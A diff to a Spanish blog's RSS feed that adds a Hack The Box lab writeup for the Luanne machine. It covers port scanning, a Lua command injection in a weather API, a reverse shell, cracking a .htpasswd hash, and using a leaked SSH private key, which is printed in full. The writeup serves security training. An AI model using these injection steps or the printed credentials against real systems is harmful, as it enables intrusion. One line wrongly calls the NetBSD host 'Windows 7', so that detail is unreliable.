@@ -5,9 +5,976 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 25 Jun 2023 00:36:22 +0000</pubDate>
-    <lastBuildDate>Sun, 25 Jun 2023 00:36:22 +0000</lastBuildDate>
+    <pubDate>Thu, 29 Jun 2023 20:19:35 +0000</pubDate>
+    <lastBuildDate>Thu, 29 Jun 2023 20:19:35 +0000</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
+    
+      <item>
+        <title>Maquina Luanne - htb writeup</title>
+        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Luanne&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad facil, para poder comprometer la maquina nos aprovecharemos de una ruta expuesta con una api en &lt;code&gt;JSON&lt;/code&gt; donde con la ayuda de &lt;code&gt;burpsuite&lt;/code&gt; aprovecharemos el uso de parametros para causar una inyección en &lt;code&gt;lua&lt;/code&gt; con la que ganaremos acceso a la maquina, despues aprovecharemos de un parametro de un servicio de &lt;code&gt;httpd&lt;/code&gt; que corre en &lt;code&gt;NETBSD&lt;/code&gt; obteniendo una clave publica con la que ganaremos acceso como un usario con mayores privilegios y finalmente en un comprimido que lograremos desencriptar obtendremos la contraseña del usuario &lt;code&gt;root&lt;/code&gt; y habremos comprometido el sistema.&lt;/p&gt;
+
+&lt;p&gt;Esta maquina es divertida asi que a darle!.&lt;/p&gt;
+
+&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Luanne
+❯ ls
+ Luanne
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.218
+PING 10.10.10.218 (10.10.10.218) 56(84) bytes of data.
+64 bytes from 10.10.10.218: icmp_seq=1 ttl=254 time=123 ms
+
+--- 10.10.10.218 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 122.913/122.913/122.913/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;254&lt;/code&gt; y contando el salto al ser &lt;code&gt;255&lt;/code&gt;, podemos usar siguiente pagina para saber a que posiblemente nos estamos enfrentando, que en este caso podria corresponder a un &lt;code&gt;NetBSD&lt;/code&gt;. Mas adelante cuando comprometamos la maquina validaremos si es correcto.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://subinsb.com/default-device-ttl-values/&quot;&gt;https://subinsb.com/default-device-ttl-values/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.218 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 16:31 GMT
+Initiating SYN Stealth Scan at 16:31
+Scanning 10.10.10.218 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.218
+Discovered open port 22/tcp on 10.10.10.218
+Discovered open port 9001/tcp on 10.10.10.218
+Completed SYN Stealth Scan at 16:32, 26.67s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.218
+Host is up, received user-set (0.28s latency).
+Scanned at 2023-06-29 16:31:40 GMT for 27s
+Not shown: 62926 filtered tcp ports (no-response), 2606 closed tcp ports (reset)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+80/tcp   open  http       syn-ack ttl 63
+9001/tcp open  tor-orport syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.83 seconds
+           Raw packets sent: 129915 (5.716MB) | Rcvd: 2611 (104.460KB)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80,9001 10.10.10.218 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 16:33 GMT
+Nmap scan report for 10.10.10.218
+Host is up (0.27s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
+| ssh-hostkey: 
+|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
+|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
+|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
+80/tcp   open  http    nginx 1.19.0
+| http-robots.txt: 1 disallowed entry 
+|_/weather
+|_http-server-header: nginx/1.19.0
+|_http-title: 401 Unauthorized
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=.
+9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
+|_http-title: Error response
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=default
+|_http-server-header: Medusa/1.12
+Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 190.40 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Podemos ver que nmap nos reporta dos rutas validas &lt;code&gt;robots&lt;/code&gt; y &lt;code&gt;weather&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Visulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina &lt;code&gt;Windows 7&lt;/code&gt;:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;22&lt;/td&gt;
+      &lt;td&gt;SSH&lt;/td&gt;
+      &lt;td&gt;OpenSSH 8.0&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;80&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;nginx 1.19.0&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;9001&lt;/td&gt;
+      &lt;td&gt;TOR-ORPORT&lt;/td&gt;
+      &lt;td&gt;Medusa httpd 1.12&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Comenzamos usando &lt;code&gt;whatweb&lt;/code&gt;, para determinar las tecnologias que esta usando el servicio web.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.218
+http://10.10.10.218 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[nginx/1.19.0], IP[10.10.10.218], Title[401 Unauthorized], WWW-Authenticate[.][Basic], nginx[1.19.0]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;La herramienta nos reporta &lt;code&gt;unathorized&lt;/code&gt;, en otras palabras nos solicita credenciales.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.218:9001
+http://10.10.10.218:9001 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Medusa/1.12], IP[10.10.10.218], Title[Error response], WWW-Authenticate[default][Basic]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vamos a proceder Abrimos el servicio con el navegador y vemos que efectivamente nos solicita credenciales para ingresar y si intentamos usar credenciales por defecto no conseguimos ingresar.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo siguiente que haremos sera dirigirnos a la ruta que nmap nos reporto &lt;code&gt;robots.txt&lt;/code&gt; y podemos ver que dentro la ruta &lt;code&gt;weather&lt;/code&gt; esta desabilitada.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya que la ruta se reporta como desabilitada, vamos a suponer que existe y con &lt;code&gt;wfuzz&lt;/code&gt; vamos a tratar de fuzear por archivos dentro de esa ruta.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.218/weather/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.218/weather/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+000007114:   200        1 L      12 W       90 Ch       &quot;forecast&quot;                                                                                                            
+000015529:   404        7 L      11 W       153 Ch      &quot;hitb&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Despues de aplicar fuzzing, vemos que existe una ruta &lt;code&gt;forecast&lt;/code&gt; que si la visualizamos tenemos acceso a una api &lt;code&gt;json&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En el mensaje vemos que nos pide usar un paramatro, para poder listar las ciudades.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como vemos que se estan usando parametros, vamos a pasar la petición por &lt;code&gt;burpsuite&lt;/code&gt; para tratar de realizar inyecciones en la petición que nos permitan aprovecharnos de esta, asi que mandamos la petición con ayuda de &lt;code&gt;foxyproxy&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Recibimos la petición en &lt;code&gt;burpsuite&lt;/code&gt; y la mandamos al repeater.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora trataremos de realizar una inyección en la petición incorporando una &lt;code&gt;'&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ocasionamos un&lt;code&gt;luaerror&lt;/code&gt;, asi que podemos tratar de ejecutar un comando con &lt;code&gt;lua&lt;/code&gt;, usando &lt;code&gt;os.execute()&lt;/code&gt;. y comentando la query.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En principio, la inyección parece fallar, pero vamos a volver a enviarlo esta vez haciendo &lt;code&gt;urlencode&lt;/code&gt; y esta vez si vemos la ejecución correctamente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo siguiente que haremos sera entablarnos una &lt;code&gt;revershell&lt;/code&gt; a nuestra maquina usando &lt;code&gt;mkfifo&lt;/code&gt; para que si tenemos una versión distinta de &lt;code&gt;ncat&lt;/code&gt; evitar inconenientes, para ello podemos usar la pagina web de confianza de &lt;code&gt;pentestmonkey&lt;/code&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Enviamos la petición, modificando nuestra ip, puerto en escucha y sin olvidar urlencodear la petición.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y recibimos la conexión en nuestra maquina como el usuario &lt;code&gt;httpd&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.218.
+Ncat: Connection from 10.10.10.218:65479.
+sh: can't access tty; job control turned off
+$ whoami
+_httpd
+$ hostname
+luanne.htb
+$ uname -a  
+NetBSD luanne.htb 9.0 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020  mkrepro@mkrepro.NetBSD.org:/usr/src/sys/arch/amd64/compile/GENERIC amd64
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Y vemos que si se corresponde a un &lt;code&gt;NetBSD&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a lista los procesos que se estan ejecutando en la maquina y obervamos una correspondiente al demonio de &lt;code&gt;httpd&lt;/code&gt;, por el puerto &lt;code&gt;3001&lt;/code&gt; que apunta a la ruta &lt;code&gt;weather&lt;/code&gt;similar a la que usamos para ganar acceso al sistema.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -u -X -s -i &quot;http://127.0.0.1:3000/weather/forecast?city=list'&quot;
+Enter host password for user '-X':
+
+HTTP/1.1 500 Error
+Content-Type: application/json
+
+&amp;lt;br&amp;gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
+
+curl -u -X -s -i &quot;http://127.0.0.1:3000/weather/forecast?city=list'%29%3B+os.execute%28%22id%22%29--%2B-&quot;
+Enter host password for user '-X':
+
+HTTP/1.1 500 Error
+Content-Type: application/json
+
+{&quot;code&quot;: 500,&quot;error&quot;: &quot;unknown city: listuid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
+curl -u -X -s -i &quot;http://127.0.0.1:3000/weather/forecast?city=list'%29%3B+os.execute%28%22whoami%22%29--%2B-&quot;
+Enter host password for user '-X':
+
+HTTP/1.1 500 Error
+Content-Type: application/json
+
+{&quot;code&quot;: 500,&quot;error&quot;: &quot;unknown city: list_httpd
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Observamos que tambien podemos ejecutar comandos, pero como el mismo usuario, asi que no nos serviria hacerlo. Pero vemos que en la ejecución del comando incorpora distintos parametros y podemos ver a que corresponde en &lt;code&gt;NETBSD&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Encontramos un articulo que nos explica a detalle el funcionamiento de los parametros.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://man.netbsd.org/NetBSD-9.3/i386/httpd.8&quot;&gt;https://man.netbsd.org/NetBSD-9.3/i386/httpd.8&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Entre los parametros que se utiliza en la petición, podemos ver que &lt;code&gt;-u&lt;/code&gt;, permite la transformación de localizadores uniformes de recursos de la forma &lt;code&gt;/~user/&lt;/code&gt; en el directorio &lt;code&gt;~user/public_html&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora podemos aprovecharnos de esto, para lista los recursos del directorio &lt;code&gt;r.michaels&lt;/code&gt;, pero como realiza una autenticación, necesitamos credenciales y si listamos los archivos ocultos de nuestro directorio actual, podemos ver un archivo de nombre &lt;code&gt;.htpasswd&lt;/code&gt; que al leerlo se nos reporta un usuario con una contraeña hasheada que podemos intentar crackerla con &lt;code&gt;john&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ls -la
+total 20
+drwxr-xr-x   2 root  wheel  512 Nov 25  2020 .
+drwxr-xr-x  24 root  wheel  512 Nov 24  2020 ..
+-rw-r--r--   1 root  wheel   47 Sep 16  2020 .htpasswd
+-rw-r--r--   1 root  wheel  386 Sep 17  2020 index.html
+-rw-r--r--   1 root  wheel   78 Nov 25  2020 robots.txt
+cat .htpasswd
+webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Despues de realizar el crackeo &lt;code&gt;john&lt;/code&gt;, nos reporta la contraseña en texto claro, asi que ahora que contamos con credenciales validar &lt;code&gt;webapi_user:iamthebest&lt;/code&gt;, podemos usarlas en la petición.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -s -X GET &quot;http://127.0.0.1:3001/~r.michaels/&quot; -u 'webapi_user:iamthebest'
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;/&amp;gt;
+&amp;lt;style type=&quot;text/css&quot;&amp;gt;
+table {
+	border-top: 1px solid black;
+	border-bottom: 1px solid black;
+}
+th { background: aquamarine; }
+tr:nth-child(even) { background: lavender; }
+&amp;lt;/style&amp;gt;
+&amp;lt;title&amp;gt;Index of ~r.michaels/&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Index of ~r.michaels/&amp;lt;/h1&amp;gt;
+&amp;lt;table cols=3&amp;gt;
+&amp;lt;thead&amp;gt;
+&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Name&amp;lt;th&amp;gt;Last modified&amp;lt;th align=right&amp;gt;Size
+&amp;lt;tbody&amp;gt;
+&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=&quot;../&quot;&amp;gt;Parent Directory&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;16-Sep-2020 18:20&amp;lt;td align=right&amp;gt;1kB
+&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=&quot;id_rsa&quot;&amp;gt;id_rsa&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;16-Sep-2020 16:52&amp;lt;td align=right&amp;gt;3kB
+&amp;lt;/table&amp;gt;
+&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Esta vez podemos listar el contenido del usuario &lt;code&gt;r.michaels&lt;/code&gt; y dentro vemos su &lt;code&gt;id_rsa&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Ahora tal y como nos dice el articulo de &lt;code&gt;NETBSD&lt;/code&gt;, podemos hacer uso del paramtro &lt;code&gt;-G&lt;/code&gt; para ver el output.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -s -X GET &quot;http://127.0.0.1:3001/~r.michaels/id_rsa&quot; -u 'webapi_user:iamthebest' -G id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ya con la &lt;code&gt;id_rsa&lt;/code&gt; al estar abierto el puerto &lt;code&gt;22&lt;/code&gt;, podemos conectarnos como &lt;code&gt;r.michaels&lt;/code&gt;, sin proporcionar contraseña.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nvim id_rsa
+❯ chmod 600 id_rsa
+❯ ssh -i id_rsa r.michaels@10.10.10.218
+The authenticity of host '10.10.10.218 (10.10.10.218)' can't be established.
+ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.218' (ECDSA) to the list of known hosts.
+Last login: Fri Sep 18 07:06:51 2020
+NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
+
+Welcome to NetBSD!
+
+luanne$ whoami
+r.michaels
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Visualizamos los archivos, del directorio y podemos leer la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+
